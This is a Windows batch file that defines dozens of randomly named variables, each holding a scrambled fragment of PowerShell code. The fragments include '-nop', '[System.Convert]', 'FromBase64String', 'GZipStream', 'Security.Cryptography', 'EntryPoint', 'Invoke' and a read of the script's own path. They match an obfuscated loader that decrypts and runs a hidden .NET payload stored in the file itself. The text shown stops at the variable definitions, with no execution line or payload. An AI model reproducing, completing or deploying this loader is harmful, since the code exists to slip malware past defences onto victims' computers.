@echo off
set "vskvkMKkzL=and "
set "ElsuMddlOL=Stre"
set "lcxIUWXZyr=+hAO"
set "xJDdEHdoXt=;$GM"
set "IagVdtAiZc=urit"
set "KkmTsaeNjA=bRZI"
set "owgZDuOjHJ=..-1"
set "IWQQVKNNAn=[Sys"
set "otmbZypgoA=pbFh"
set "gVQSsMABNN=gth)"
set "NVawaKADdW=THB."
set "hUNptPSPBj=Disp"
set "dYesXMdpdn=THB "
set "cAFhfkPizN=m.IO"
set "uCfjOWeEPT=gnir"
set "hUnAfrupUX=ress"
set "QMVTBEDZJk=::('"
set "YvKyBXJwFD=V = "
set "LFobtykGIV=lBlo"
set "DcGIfxjvIF=le  "
set "xwcdiEOdNR='dqR"
set "kCfFqrAYpF=in $"
set "EdRSbMmbZv=Invo"
set "nazpqcKZJm=IGOf"
set "GzXpzXZvOG=rity"
set "dvcQgjgeoP=rofi"
set "GfPOeAlRaK=.GZi"
set "FQBRlavNZW=mLUX"
set "laVywfjBJn=oint"
set "gyNOYFQoru=Secu"
set "nyVGRoPXVY=null"
set "fdYfvjhRGS= '')"
set "xMQQXgqfcG=ode]"
set "qWkYDxnrZl=jgx."
set "IlTSWIGWri=ne);"
set "kAtjtyENrJ=3HWs"
set "ptAxSRzdbF=i = "
set "qjipbOSALI=g = "
set "hxfZWtWqIJ=Obje"
set "NdNUvNwrvh=)) {"
set "BvambiWxCM=onve"
set "ZWYwKwLAod=.Con"
set "bpmRrVsDys=.IO."
set "SqBBCAAUBY=saBm"
set "eclftZyQLt=aWqS"
set "rKWeJRWsJO=TllA"
set "LtQZGjksoW=t Sy"
set "fyOtyQPuqz=Fh.D"
set "bzMMfknBbz=Ofy."
set "HVueafeHsJ=QmZ "
set "OtdCKlLkGA=);$e"
set "bZotkfHagP=bRZI"
set "fMIdTyDQdk=.Dis"
set "yXkzblYhoH=vMoL"
set "oyquxUzeRq=em.I"
set "UtQiqNgLEz=tS46"
set "VNUluhbbNE=comm"
set "uZIknXiIln=ress"
set "lYVUiaYWUh=();$"
set "aZVCdXfOER=)($v"
set "fLoqAhLXaR=]::("
set "lXLTSeKjbi=embl"
set "rdCMKRUdlt=Kh);"
set "MSbnFXruXq=oL'["
set "NTPydvOCjg=am;$"
set "BfEAVTDTTH=);$L"
set "rVsENtIRvd=$aWq"
set "KkkjnFNnXH=('da"
set "dWYKfhmAaf=nage"
set "aNSZhngIlu=;$ZR"
set "kMHfMxWMCO='[-1"
set "RkYWAMrVYk=orF'"
set "llPGOdbvZO=Fo7l"
set "VPZCInmEwN=$IGO"
set "mzUAYvxVLx=lit("
set "OrLzeVEFun=UX.I"
set "afiJFcPBTT=esaB"
set "JnvivglAzD=OyzA"
set "VCMrqUvmud=SDTH"
set "tZdGWUYAiw=oin "
set "JsDENQkWUk=eam("
set "amjDyUuSIO=$emL"
set "XXXnnJDdzH=Syst"
set "zpIEUBgMGK=ddin"
set "RSBxIZNDWd=, (,"
set "xSvjkotvDL=..-1"
set "XtedNbaqyU=stem"
set "MfBNeKUcQE=S46e"
set "npRmdowhRn=-joi"
set "ucMwZdYUUi=tryP"
set "VDtTtEwIsJ=mLUX"
set "pPcvpyVLnM=DpbF"
set "kYmfgprxZH=ert]"
set "htVBtKwdSJ=ose("
set "twGYLLxwJv=pose"
set "lQwuvBXKme=nirt"
set "TqDlJusJTP=]::C"
set "WEvQCgSBpy=y.Ci"
set "DnybbcDOah='txe"
set "OqSSJVboXH=.Len"
set "dWqePQpbNH=; };"
set "KOWsAzbCkA= '')"
set "HkVIrxfQvZ=  $v"
set "BSoHaQgqKu=('%~f0'"
set "UcoPuSUqEf=tion"
set "CNpuMEHEgf=rt]:"
set "OWtDHmvyYb=d;$e"
set "TnrdlXlxwp=ionM"
set "LqqMNBgTDE='gni"
set "ugFcGWwlOK=736u"
set "lqRXXZoJKA=sGUc"
set "ISlEzuBxoy=k; }"
set "kAuajVqDTr=vert"
set "aGxPYWhpph=join"
set "TJgPUtEeWF=.Ass"
set "HtwKTgOFrM=($SD"
set "TAALEOMuCl=e]::"
set "LtRKOrDhqw=tem."
set "JOKmczQldj=ptor"
set "poWPPevNlI=Comp"
set "LDEvKsWMEb=-Obj"
set "CsjXxoZuFK=ddin"
set "jWWTKejCRn=-nop"
set "PKKkKeDWsx=;$ZR"
set "HdFFrGvdzi=);$D"
set "PLuvyFCKbB=Conv"
set "atSAQCpehE='')("
